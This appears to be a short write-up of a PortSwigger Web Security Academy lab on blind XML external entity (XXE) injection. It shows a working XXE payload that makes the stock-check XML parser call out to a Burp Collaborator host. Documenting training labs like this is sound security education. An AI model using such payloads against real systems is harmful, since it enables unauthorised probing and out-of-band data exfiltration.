
# Blind XXE with out-of-band interaction

This lab has a "Check stock" feature that parses XML input but does not display the result.

You can detect the blind XXE vulnerability by triggering out-of-band interactions with an external domain.

To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.

Note: To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

---------------------------------------------

References: 

- https://portswigger.net/web-security/xxe/blind



![img](images/Blind%20XXE%20with%20out-of-band%20interaction/1.png)

---------------------------------------------


Using the same payload as the last lab but changing the url for a Collaborator url we have this payload:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://3vzysj2gzhhn64eedhoks71zjqphd71w.oastify.com"> ]>
<stockCheck>
	<productId>
		&xxe;
	</productId>
	<storeId>
		1
	</storeId>
</stockCheck>
```



![img](images/Blind%20XXE%20with%20out-of-band%20interaction/2.png)


And there are requests in the Collaborator tab:



![img](images/Blind%20XXE%20with%20out-of-band%20interaction/3.png)
